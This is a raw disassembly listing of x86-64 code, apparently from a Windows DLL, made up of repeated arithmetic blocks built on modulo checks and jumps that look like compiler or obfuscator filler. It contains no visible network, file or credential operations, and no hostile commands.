   1800024c4:	41 b8 01 00 00 80    	mov    $0x80000001,%r8d
   1800024ca:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   1800024cf:	4d 8b da             	mov    %r10,%r11
   1800024d2:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800024d8:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800024de:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800024e4:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800024ea:	03 c8                	add    %eax,%ecx
   1800024ec:	41 8b c1             	mov    %r9d,%eax
   1800024ef:	f7 e9                	imul   %ecx
   1800024f1:	8b c2                	mov    %edx,%eax
   1800024f3:	c1 e8 1f             	shr    $0x1f,%eax
   1800024f6:	03 d0                	add    %eax,%edx
   1800024f8:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800024fb:	3b c8                	cmp    %eax,%ecx
   1800024fd:	0f 84 ab 00 00 00    	je     0x1800025ae
   180002503:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002509:	41 03 cf             	add    %r15d,%ecx
   18000250c:	41 03 cd             	add    %r13d,%ecx
   18000250f:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002515:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   18000251a:	eb 78                	jmp    0x180002594
   18000251c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002522:	41 8b cf             	mov    %r15d,%ecx
   180002525:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000252b:	41 2b cd             	sub    %r13d,%ecx
   18000252e:	03 c8                	add    %eax,%ecx
   180002530:	41 b8 01 00 00 80    	mov    $0x80000001,%r8d
   180002536:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   18000253c:	eb 1c                	jmp    0x18000255a
   18000253e:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002544:	03 c3                	add    %ebx,%eax
   180002546:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000254c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002552:	03 c3                	add    %ebx,%eax
   180002554:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000255a:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002560:	41 8b c1             	mov    %r9d,%eax
   180002563:	f7 e9                	imul   %ecx
   180002565:	8b c2                	mov    %edx,%eax
   180002567:	c1 e8 1f             	shr    $0x1f,%eax
   18000256a:	03 d0                	add    %eax,%edx
   18000256c:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000256f:	3b c8                	cmp    %eax,%ecx
   180002571:	74 cb                	je     0x18000253e
   180002573:	e9 52 ff ff ff       	jmp    0x1800024ca
   180002578:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000257e:	03 c3                	add    %ebx,%eax
   180002580:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002586:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000258c:	03 c3                	add    %ebx,%eax
   18000258e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002594:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000259a:	23 c1                	and    %ecx,%eax
   18000259c:	7d 07                	jge    0x1800025a5
   18000259e:	2b c3                	sub    %ebx,%eax
   1800025a0:	83 c8 fc             	or     $0xfffffffc,%eax
   1800025a3:	03 c3                	add    %ebx,%eax
   1800025a5:	85 c0                	test   %eax,%eax
   1800025a7:	74 cf                	je     0x180002578
   1800025a9:	e9 ce 00 00 00       	jmp    0x18000267c
   1800025ae:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800025b4:	41 23 c0             	and    %r8d,%eax
   1800025b7:	7d 07                	jge    0x1800025c0
   1800025b9:	2b c3                	sub    %ebx,%eax
   1800025bb:	83 c8 fe             	or     $0xfffffffe,%eax
   1800025be:	03 c3                	add    %ebx,%eax
   1800025c0:	85 c0                	test   %eax,%eax
   1800025c2:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800025c8:	74 47                	je     0x180002611
   1800025ca:	41 8b cf             	mov    %r15d,%ecx
   1800025cd:	41 2b cd             	sub    %r13d,%ecx
   1800025d0:	03 c8                	add    %eax,%ecx
   1800025d2:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800025d8:	eb 1c                	jmp    0x1800025f6
   1800025da:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800025e0:	03 c3                	add    %ebx,%eax
   1800025e2:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800025e8:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800025ee:	03 c3                	add    %ebx,%eax
   1800025f0:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800025f6:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800025fc:	41 8b c1             	mov    %r9d,%eax
   1800025ff:	f7 e9                	imul   %ecx
   180002601:	8b c2                	mov    %edx,%eax
   180002603:	c1 e8 1f             	shr    $0x1f,%eax
   180002606:	03 d0                	add    %eax,%edx
   180002608:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000260b:	3b c8                	cmp    %eax,%ecx
   18000260d:	74 cb                	je     0x1800025da
   18000260f:	eb 6b                	jmp    0x18000267c
   180002611:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002617:	41 8d 45 03          	lea    0x3(%r13),%eax
   18000261b:	41 03 cf             	add    %r15d,%ecx
   18000261e:	0f af c8             	imul   %eax,%ecx
   180002621:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002627:	eb 3d                	jmp    0x180002666
   180002629:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000262f:	03 c3                	add    %ebx,%eax
   180002631:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002637:	b8 67 66 66 66       	mov    $0x66666667,%eax
   18000263c:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002642:	f7 e9                	imul   %ecx
   180002644:	d1 fa                	sar    $1,%edx
   180002646:	8b c2                	mov    %edx,%eax
   180002648:	c1 e8 1f             	shr    $0x1f,%eax
   18000264b:	03 d0                	add    %eax,%edx
   18000264d:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180002650:	3b c8                	cmp    %eax,%ecx
   180002652:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002658:	74 04                	je     0x18000265e
   18000265a:	2b c3                	sub    %ebx,%eax
   18000265c:	eb 02                	jmp    0x180002660
   18000265e:	03 c3                	add    %ebx,%eax
   180002660:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002666:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000266c:	41 23 c0             	and    %r8d,%eax
   18000266f:	7d 07                	jge    0x180002678
   180002671:	2b c3                	sub    %ebx,%eax
   180002673:	83 c8 fe             	or     $0xfffffffe,%eax
   180002676:	03 c3                	add    %ebx,%eax
   180002678:	85 c0                	test   %eax,%eax
   18000267a:	74 ad                	je     0x180002629
   18000267c:	4d 85 d2             	test   %r10,%r10
   18000267f:	0f 84 bd 4d 00 00    	je     0x180007442
   180002685:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   18000268a:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002690:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002696:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   18000269c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800026a2:	03 c8                	add    %eax,%ecx
   1800026a4:	41 8b c1             	mov    %r9d,%eax
   1800026a7:	f7 e9                	imul   %ecx
   1800026a9:	8b c2                	mov    %edx,%eax
   1800026ab:	c1 e8 1f             	shr    $0x1f,%eax
   1800026ae:	03 d0                	add    %eax,%edx
   1800026b0:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800026b3:	3b c8                	cmp    %eax,%ecx
   1800026b5:	74 4f                	je     0x180002706
   1800026b7:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800026bd:	41 03 cf             	add    %r15d,%ecx
   1800026c0:	41 03 cd             	add    %r13d,%ecx
   1800026c3:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800026c9:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   1800026ce:	eb 1c                	jmp    0x1800026ec
   1800026d0:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800026d6:	03 c3                	add    %ebx,%eax
   1800026d8:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800026de:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800026e4:	03 c3                	add    %ebx,%eax
   1800026e6:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800026ec:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800026f2:	23 c1                	and    %ecx,%eax
   1800026f4:	7d 07                	jge    0x1800026fd
   1800026f6:	2b c3                	sub    %ebx,%eax
   1800026f8:	83 c8 fc             	or     $0xfffffffc,%eax
   1800026fb:	03 c3                	add    %ebx,%eax
   1800026fd:	85 c0                	test   %eax,%eax
   1800026ff:	74 cf                	je     0x1800026d0
   180002701:	e9 ce 00 00 00       	jmp    0x1800027d4
   180002706:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000270c:	41 23 c0             	and    %r8d,%eax
   18000270f:	7d 07                	jge    0x180002718
   180002711:	2b c3                	sub    %ebx,%eax
   180002713:	83 c8 fe             	or     $0xfffffffe,%eax
   180002716:	03 c3                	add    %ebx,%eax
   180002718:	85 c0                	test   %eax,%eax
   18000271a:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002720:	74 47                	je     0x180002769
   180002722:	41 8b cf             	mov    %r15d,%ecx
   180002725:	41 2b cd             	sub    %r13d,%ecx
   180002728:	03 c8                	add    %eax,%ecx
   18000272a:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002730:	eb 1c                	jmp    0x18000274e
   180002732:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002738:	03 c3                	add    %ebx,%eax
   18000273a:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002740:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002746:	03 c3                	add    %ebx,%eax
   180002748:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000274e:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002754:	41 8b c1             	mov    %r9d,%eax
   180002757:	f7 e9                	imul   %ecx
   180002759:	8b c2                	mov    %edx,%eax
   18000275b:	c1 e8 1f             	shr    $0x1f,%eax
   18000275e:	03 d0                	add    %eax,%edx
   180002760:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002763:	3b c8                	cmp    %eax,%ecx
   180002765:	74 cb                	je     0x180002732
   180002767:	eb 6b                	jmp    0x1800027d4
   180002769:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000276f:	41 8d 45 03          	lea    0x3(%r13),%eax
   180002773:	41 03 cf             	add    %r15d,%ecx
   180002776:	0f af c8             	imul   %eax,%ecx
   180002779:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   18000277f:	eb 3d                	jmp    0x1800027be
   180002781:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002787:	03 c3                	add    %ebx,%eax
   180002789:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000278f:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180002794:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000279a:	f7 e9                	imul   %ecx
   18000279c:	d1 fa                	sar    $1,%edx
   18000279e:	8b c2                	mov    %edx,%eax
   1800027a0:	c1 e8 1f             	shr    $0x1f,%eax
   1800027a3:	03 d0                	add    %eax,%edx
   1800027a5:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800027a8:	3b c8                	cmp    %eax,%ecx
   1800027aa:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800027b0:	74 04                	je     0x1800027b6
   1800027b2:	2b c3                	sub    %ebx,%eax
   1800027b4:	eb 02                	jmp    0x1800027b8
   1800027b6:	03 c3                	add    %ebx,%eax
   1800027b8:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800027be:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800027c4:	41 23 c0             	and    %r8d,%eax
   1800027c7:	7d 07                	jge    0x1800027d0
   1800027c9:	2b c3                	sub    %ebx,%eax
   1800027cb:	83 c8 fe             	or     $0xfffffffe,%eax
   1800027ce:	03 c3                	add    %ebx,%eax
   1800027d0:	85 c0                	test   %eax,%eax
   1800027d2:	74 ad                	je     0x180002781
   1800027d4:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   1800027d9:	41 b8 56 55 55 55    	mov    $0x55555556,%r8d
   1800027df:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800027e5:	45 33 c9             	xor    %r9d,%r9d
   1800027e8:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800027ee:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800027f4:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800027fa:	03 c8                	add    %eax,%ecx
   1800027fc:	41 8b c0             	mov    %r8d,%eax
   1800027ff:	f7 e9                	imul   %ecx
   180002801:	8b c2                	mov    %edx,%eax
   180002803:	c1 e8 1f             	shr    $0x1f,%eax
   180002806:	03 d0                	add    %eax,%edx
   180002808:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000280b:	3b c8                	cmp    %eax,%ecx
   18000280d:	74 4c                	je     0x18000285b
   18000280f:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002815:	41 03 cf             	add    %r15d,%ecx
   180002818:	41 03 cd             	add    %r13d,%ecx
   18000281b:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002821:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   180002826:	eb 1c                	jmp    0x180002844
   180002828:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000282e:	03 c3                	add    %ebx,%eax
   180002830:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002836:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000283c:	03 c3                	add    %ebx,%eax
   18000283e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002844:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000284a:	23 c1                	and    %ecx,%eax
   18000284c:	7d 07                	jge    0x180002855
   18000284e:	2b c3                	sub    %ebx,%eax
   180002850:	83 c8 fc             	or     $0xfffffffc,%eax
   180002853:	03 c3                	add    %ebx,%eax
   180002855:	85 c0                	test   %eax,%eax
   180002857:	74 cf                	je     0x180002828
   180002859:	eb 51                	jmp    0x1800028ac
   18000285b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002861:	41 8b cf             	mov    %r15d,%ecx
   180002864:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000286a:	41 2b cd             	sub    %r13d,%ecx
   18000286d:	03 c8                	add    %eax,%ecx
   18000286f:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002875:	eb 1c                	jmp    0x180002893
   180002877:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000287d:	03 c3                	add    %ebx,%eax
   18000287f:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002885:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000288b:	03 c3                	add    %ebx,%eax
   18000288d:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002893:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002899:	41 8b c0             	mov    %r8d,%eax
   18000289c:	f7 e9                	imul   %ecx
   18000289e:	8b c2                	mov    %edx,%eax
   1800028a0:	c1 e8 1f             	shr    $0x1f,%eax
   1800028a3:	03 d0                	add    %eax,%edx
   1800028a5:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800028a8:	3b c8                	cmp    %eax,%ecx
   1800028aa:	74 cb                	je     0x180002877
   1800028ac:	8b 44 24 24          	mov    0x24(%rsp),%eax
   1800028b0:	45 33 c0             	xor    %r8d,%r8d
   1800028b3:	85 c0                	test   %eax,%eax
   1800028b5:	0f 84 59 08 00 00    	je     0x180003114
   1800028bb:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   1800028c0:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800028c6:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800028cc:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800028d2:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800028d8:	03 c8                	add    %eax,%ecx
   1800028da:	b8 56 55 55 55       	mov    $0x55555556,%eax
   1800028df:	f7 e9                	imul   %ecx
   1800028e1:	8b c2                	mov    %edx,%eax
   1800028e3:	c1 e8 1f             	shr    $0x1f,%eax
   1800028e6:	03 d0                	add    %eax,%edx
   1800028e8:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800028eb:	3b c8                	cmp    %eax,%ecx
   1800028ed:	74 4c                	je     0x18000293b
   1800028ef:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800028f5:	41 03 cf             	add    %r15d,%ecx
   1800028f8:	41 03 cd             	add    %r13d,%ecx
   1800028fb:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002901:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   180002906:	eb 1c                	jmp    0x180002924
   180002908:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000290e:	03 c3                	add    %ebx,%eax
   180002910:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002916:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000291c:	03 c3                	add    %ebx,%eax
   18000291e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002924:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000292a:	23 c1                	and    %ecx,%eax
   18000292c:	7d 07                	jge    0x180002935
   18000292e:	2b c3                	sub    %ebx,%eax
   180002930:	83 c8 fc             	or     $0xfffffffc,%eax
   180002933:	03 c3                	add    %ebx,%eax
   180002935:	85 c0                	test   %eax,%eax
   180002937:	74 cf                	je     0x180002908
   180002939:	eb 53                	jmp    0x18000298e
   18000293b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002941:	41 8b cf             	mov    %r15d,%ecx
   180002944:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000294a:	41 2b cd             	sub    %r13d,%ecx
   18000294d:	03 c8                	add    %eax,%ecx
   18000294f:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002955:	eb 1c                	jmp    0x180002973
   180002957:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000295d:	03 c3                	add    %ebx,%eax
   18000295f:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002965:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000296b:	03 c3                	add    %ebx,%eax
   18000296d:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002973:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002979:	b8 56 55 55 55       	mov    $0x55555556,%eax
   18000297e:	f7 e9                	imul   %ecx
   180002980:	8b c2                	mov    %edx,%eax
   180002982:	c1 e8 1f             	shr    $0x1f,%eax
   180002985:	03 d0                	add    %eax,%edx
   180002987:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000298a:	3b c8                	cmp    %eax,%ecx
   18000298c:	74 c9                	je     0x180002957
   18000298e:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180002993:	44 03 cb             	add    %ebx,%r9d
   180002996:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000299c:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800029a2:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800029a8:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800029ae:	03 c8                	add    %eax,%ecx
   1800029b0:	b8 56 55 55 55       	mov    $0x55555556,%eax
   1800029b5:	f7 e9                	imul   %ecx
   1800029b7:	8b c2                	mov    %edx,%eax
   1800029b9:	c1 e8 1f             	shr    $0x1f,%eax
   1800029bc:	03 d0                	add    %eax,%edx
   1800029be:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800029c1:	3b c8                	cmp    %eax,%ecx
   1800029c3:	74 4c                	je     0x180002a11
   1800029c5:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800029cb:	41 03 cf             	add    %r15d,%ecx
   1800029ce:	41 03 cd             	add    %r13d,%ecx
   1800029d1:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800029d7:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   1800029dc:	eb 1c                	jmp    0x1800029fa
   1800029de:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800029e4:	03 c3                	add    %ebx,%eax
   1800029e6:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800029ec:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800029f2:	03 c3                	add    %ebx,%eax
   1800029f4:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800029fa:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002a00:	23 c1                	and    %ecx,%eax
   180002a02:	7d 07                	jge    0x180002a0b
   180002a04:	2b c3                	sub    %ebx,%eax
   180002a06:	83 c8 fc             	or     $0xfffffffc,%eax
   180002a09:	03 c3                	add    %ebx,%eax
   180002a0b:	85 c0                	test   %eax,%eax
   180002a0d:	74 cf                	je     0x1800029de
   180002a0f:	eb 53                	jmp    0x180002a64
   180002a11:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002a17:	41 8b cf             	mov    %r15d,%ecx
   180002a1a:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002a20:	41 2b cd             	sub    %r13d,%ecx
   180002a23:	03 c8                	add    %eax,%ecx
   180002a25:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002a2b:	eb 1c                	jmp    0x180002a49
   180002a2d:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002a33:	03 c3                	add    %ebx,%eax
   180002a35:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002a3b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002a41:	03 c3                	add    %ebx,%eax
   180002a43:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002a49:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002a4f:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180002a54:	f7 e9                	imul   %ecx
   180002a56:	8b c2                	mov    %edx,%eax
   180002a58:	c1 e8 1f             	shr    $0x1f,%eax
   180002a5b:	03 d0                	add    %eax,%edx
   180002a5d:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002a60:	3b c8                	cmp    %eax,%ecx
   180002a62:	74 c9                	je     0x180002a2d
   180002a64:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180002a69:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002a6f:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002a75:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180002a7b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002a81:	03 c8                	add    %eax,%ecx
   180002a83:	44 84 cb             	test   %r9b,%bl
   180002a86:	0f 85 40 03 00 00    	jne    0x180002dcc
   180002a8c:	41 b9 56 55 55 55    	mov    $0x55555556,%r9d
   180002a92:	41 8b c1             	mov    %r9d,%eax
   180002a95:	f7 e9                	imul   %ecx
   180002a97:	8b c2                	mov    %edx,%eax
   180002a99:	c1 e8 1f             	shr    $0x1f,%eax
   180002a9c:	03 d0                	add    %eax,%edx
   180002a9e:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002aa1:	3b c8                	cmp    %eax,%ecx
   180002aa3:	74 4c                	je     0x180002af1
   180002aa5:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002aab:	41 03 cf             	add    %r15d,%ecx
   180002aae:	41 03 cd             	add    %r13d,%ecx
   180002ab1:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002ab7:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   180002abc:	eb 1c                	jmp    0x180002ada
   180002abe:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002ac4:	03 c3                	add    %ebx,%eax
   180002ac6:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002acc:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002ad2:	03 c3                	add    %ebx,%eax
   180002ad4:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002ada:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002ae0:	23 c1                	and    %ecx,%eax
   180002ae2:	7d 07                	jge    0x180002aeb
   180002ae4:	2b c3                	sub    %ebx,%eax
   180002ae6:	83 c8 fc             	or     $0xfffffffc,%eax
   180002ae9:	03 c3                	add    %ebx,%eax
   180002aeb:	85 c0                	test   %eax,%eax
   180002aed:	74 cf                	je     0x180002abe
   180002aef:	eb 51                	jmp    0x180002b42
   180002af1:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002af7:	41 8b cf             	mov    %r15d,%ecx
   180002afa:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002b00:	41 2b cd             	sub    %r13d,%ecx
   180002b03:	03 c8                	add    %eax,%ecx
   180002b05:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002b0b:	eb 1c                	jmp    0x180002b29
   180002b0d:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002b13:	03 c3                	add    %ebx,%eax
   180002b15:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002b1b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002b21:	03 c3                	add    %ebx,%eax
   180002b23:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002b29:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002b2f:	41 8b c1             	mov    %r9d,%eax
   180002b32:	f7 e9                	imul   %ecx
   180002b34:	8b c2                	mov    %edx,%eax
   180002b36:	c1 e8 1f             	shr    $0x1f,%eax
   180002b39:	03 d0                	add    %eax,%edx
   180002b3b:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002b3e:	3b c8                	cmp    %eax,%ecx
   180002b40:	74 cb                	je     0x180002b0d
   180002b42:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180002b47:	45 33 c9             	xor    %r9d,%r9d
   180002b4a:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002b50:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002b56:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180002b5c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002b62:	03 c8                	add    %eax,%ecx
   180002b64:	b8 56 55 55 55       	mov    $0x55555556,%eax
   180002b69:	f7 e9                	imul   %ecx
   180002b6b:	8b c2                	mov    %edx,%eax
   180002b6d:	c1 e8 1f             	shr    $0x1f,%eax
   180002b70:	03 d0                	add    %eax,%edx
   180002b72:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002b75:	3b c8                	cmp    %eax,%ecx
   180002b77:	74 4c                	je     0x180002bc5
   180002b79:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002b7f:	41 03 cf             	add    %r15d,%ecx
   180002b82:	41 03 cd             	add    %r13d,%ecx
   180002b85:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002b8b:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   180002b90:	eb 1c                	jmp    0x180002bae
   180002b92:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002b98:	03 c3                	add    %ebx,%eax
   180002b9a:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002ba0:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002ba6:	03 c3                	add    %ebx,%eax
   180002ba8:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002bae:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002bb4:	23 c1                	and    %ecx,%eax
   180002bb6:	7d 07                	jge    0x180002bbf
   180002bb8:	2b c3                	sub    %ebx,%eax
   180002bba:	83 c8 fc             	or     $0xfffffffc,%eax
   180002bbd:	03 c3                	add    %ebx,%eax
   180002bbf:	85 c0                	test   %eax,%eax
   180002bc1:	74 cf                	je     0x180002b92
   180002bc3:	eb 53                	jmp    0x180002c18
   180002bc5:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002bcb:	41 8b cf             	mov    %r15d,%ecx
   180002bce:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002bd4:	41 2b cd             	sub    %r13d,%ecx
   180002bd7:	03 c8                	add    %eax,%ecx
   180002bd9:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
